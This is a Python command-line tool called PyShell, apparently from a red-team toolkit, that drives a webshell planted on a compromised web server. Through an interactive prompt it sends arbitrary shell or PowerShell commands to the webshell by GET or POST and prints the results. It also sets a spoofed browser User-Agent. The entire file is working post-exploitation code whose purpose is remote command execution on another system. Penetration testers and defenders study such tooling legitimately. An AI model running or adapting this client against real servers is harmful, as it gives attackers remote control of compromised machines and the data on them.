#!/usr/bin/python3
import sys
import requests
import readline
import argparse
from termcolor import colored


def send_command(command, webshell, method, param="code"):
    headers = {"User-Agent":"Mozilla/6.4 (Windows NT 11.1) Gecko/2010102 Firefox/99.0"}
    params = {param.strip():command.strip()}
    if (method.upper() == "GET"):
        response = requests.get((webshell), params=params, headers=headers)
    elif (method.upper() == "POST"):
        response = requests.post((webshell), data=params, headers=headers)
    return response.content.decode(errors='ignore')


if __name__ == "__main__":
    banner = """
  ██▓███ ▓██   ██▓  ██████  ██░ ██ ▓█████  ██▓     ██▓    
 ▓██░  ██▒▒██  ██▒▒██    ▒ ▓██░ ██▒▓█   ▀ ▓██▒    ▓██▒    
 ▓██░ ██▓▒ ▒██ ██░░ ▓██▄   ▒██▀▀██░▒███   ▒██░    ▒██░    
 ▒██▄█▓▒ ▒ ░ ▐██▓░  ▒   ██▒░▓█ ░██ ▒▓█  ▄ ▒██░    ▒██░    
 ▒██▒ ░  ░ ░ ██▒▓░▒██████▒▒░▓█▒░██▓░▒████▒░██████▒░██████▒
 ▒█▒░ ░  ░  ██▒▒▒ ▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒░░ ▒░ ░░ ▒░▓  ░░ ▒░▓  ░
 ░▒ ░     ▓██ ░▒░ ░ ░▒    ░ ▒ ░▒░ ░ ░ ░  ░░ ░ ▒  ░░ ░ ▒  ░
 ░░   ░   ▒ ▒ ░░  ░  ░  ░   ░  ░░ ░         ░ ░     ░ ░   
 ░        ░             ░      ░      ░       ░          ░ 

 --------------- by @JoelGMSec & @3v4Si0N ---------------

 """

    print (colored(banner, 'green'))
    parser = argparse.ArgumentParser(description='Pyshell')
    parser.add_argument('url', help='Webshell URL', type=str)
    parser.add_argument('method', help='HTTP Method to execute command (GET or POST)', type=str)
    parser.add_argument('--ps', default=False, action="store_true", help='Powershell shell (Only Windows)')
    parser.add_argument('-p', '--param', default="code", help='Parameter to use when you find custom webshell', type=str)
    args = parser.parse_args()

    try:
        WEBSHELL = args.url
        HTTP_METHOD = args.method
        PARAM = args.param

        while True:
            try:
                command = input(colored("PyShell $> ", "green"))
                if command == "exit":
                    print (colored("\nExiting..\n", "red"))
                    break
                else:
                    if args.ps:
                        result = send_command("powershell " + command, WEBSHELL, HTTP_METHOD, PARAM)
                        print (colored(result, "yellow"))
                    else:
                        result = send_command(command, WEBSHELL, HTTP_METHOD, PARAM)
                        print (colored(result, "yellow"))

            except KeyboardInterrupt:
                print (colored("\nExiting..\n", "red"))
                break
    except Exception as e:
        print(e)
